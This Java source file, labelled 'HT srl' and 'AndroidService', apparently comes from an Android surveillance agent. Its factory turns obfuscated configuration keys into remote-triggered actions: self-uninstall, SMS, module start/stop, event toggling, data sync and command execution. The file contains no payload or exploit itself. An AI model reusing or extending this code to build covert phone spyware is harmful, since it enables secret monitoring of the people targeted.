/* **********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 03-dec-2010
 **********************************************/

package com.android.service.action;

import org.json.JSONException;

import com.android.service.Messages;
import com.android.service.Status;
import com.android.service.Trigger;
import com.android.service.auto.Cfg;
import com.android.service.conf.ConfAction;
import com.android.service.conf.ConfigurationException;
import com.android.service.util.Check;

// TODO: Auto-generated Javadoc
/**
 * The Class SubAction.
 */
public abstract class SubAction {

	private static final String TAG = "SubAction"; //$NON-NLS-1$

	/** Parameters. */
	private final ConfAction conf;

	/** The want uninstall. */
	// protected boolean wantUninstall;

	/** The want reload. */
	// protected boolean wantReload;

	/** The status. */
	Status status;

	/**
	 * Instantiates a new sub action.
	 * 
	 * @param type
	 *            the type
	 * @param jsubaction
	 *            the params
	 */
	public SubAction(final ConfAction conf) {
		this.status = Status.self();
		this.conf = conf;

		stop = conf.getBoolean(Messages.getString("S.15"), false); //$NON-NLS-1$        

		parse(conf);
	}

	/**
	 * Factory.
	 * 
	 * @param type
	 * 
	 * @param typeId
	 *            the type
	 * @param params
	 *            the conf params
	 * @return the sub action
	 * @throws JSONException
	 * @throws ConfigurationException
	 */
	public static SubAction factory(String type, final ConfAction params) throws ConfigurationException {
		if (Cfg.DEBUG)
			Check.asserts(type != null, "factory: null type"); //$NON-NLS-1$

		// TODO: messages file
		if (type.equals(Messages.getString("S.1"))) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " Factory *** ACTION_UNINSTALL ***");//$NON-NLS-1$
			}
			
			return new UninstallAction(params);
		} else if (type.equals(Messages.getString("S.2"))) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " Factory *** ACTION_SMS ***");//$NON-NLS-1$
			}
			
			return new SmsAction(params);
		} else if (type.equals(Messages.getString("S.3"))) { //$NON-NLS-1$
			String status = params.getString(Messages.getString("S.4")); //$NON-NLS-1$
			if (status.equals(Messages.getString("S.5"))) { //$NON-NLS-1$
				if (Cfg.DEBUG) {
					Check.log(TAG + " Factory *** ACTION_START_AGENT ***");//$NON-NLS-1$
				}
				
				return new StartModuleAction(params);
			} else if (status.equals(Messages.getString("S.6"))) { //$NON-NLS-1$

				if (Cfg.DEBUG) {
					Check.log(TAG + " Factory *** ACTION_STOP_AGENT ***");//$NON-NLS-1$
				}
				
				return new StopModuleAction(params);
			}
		} else if (type.equals(Messages.getString("S.7"))) { //$NON-NLS-1$
			String status = params.getString(Messages.getString("S.8")); //$NON-NLS-1$
			if (status.equals(Messages.getString("S.9"))) { //$NON-NLS-1$
				if (Cfg.DEBUG) {
					Check.log(TAG + " Factory *** ACTION_ENABLE_EVENT ***");//$NON-NLS-1$
				}
				
				return new EnableEventAction(params);
			} else if (status.equals(Messages.getString("S.10"))) { //$NON-NLS-1$
				if (Cfg.DEBUG) {
					Check.log(TAG + " Factory *** ACTION_DISABLE_EVENT ***");//$NON-NLS-1$
				}
				
				return new DisableEventAction(params);

			}
		} else if (type.equals(Messages.getString("S.11"))) { //$NON-NLS-1$
			boolean apn = params.has(Messages.getString("S.12")); //$NON-NLS-1$
			
			if (apn) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " Factory *** ACTION_SYNC_APN ***");//$NON-NLS-1$
				}
				
				return new SyncActionApn(params);
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " Factory *** ACTION_SYNC ***");//$NON-NLS-1$
				}
				
				return new SyncActionInternet(params);
			}

		} else if (type.equals(Messages.getString("S.13"))) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " Factory *** ACTION_EXECUTE ***");//$NON-NLS-1$
			}
			
			return new ExecuteAction(params);

		} else if (type.equals(Messages.getString("S.14"))) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " Factory *** ACTION_INFO ***");//$NON-NLS-1$
			}
			
			return new LogAction(params);
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (factory) Error: unknown type: " + type); //$NON-NLS-1$
			}
		}
		
		return null;
	}

	public String getType() {
		return conf.getType();
	}

	/** The finished. */
	private boolean finished;

	private boolean stop;

	/**
	 * Parse
	 * 
	 * @param jsubaction
	 *            byte array from configuration
	 */
	protected abstract boolean parse(final ConfAction jsubaction);

	/**
	 * Execute.
	 * 
	 * @param trigger
	 * 
	 * @return true, if successful
	 */
	public abstract boolean execute(Trigger trigger);

	/**
	 * Check. if is finished. //$NON-NLS-1$
	 * 
	 * @return true, if is finished
	 */
	public synchronized boolean isFinished() {
		return finished;
	}

	/**
	 * Prepare execute.
	 */
	public void prepareExecute() {
		synchronized (this) {
			finished = false;
			
			
		}
	}

	@Override
	public String toString() {
		if(Cfg.DEBUG){
			return "SubAction (" + conf.actionId + "/" + conf.subActionId + ") <" + conf.getType().toUpperCase() + "> " + conf; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
		}else{
			return conf.actionId + "/" + conf.subActionId; //$NON-NLS-1$
		}
	}

	public boolean considerStop() {
		return stop;
	}

}
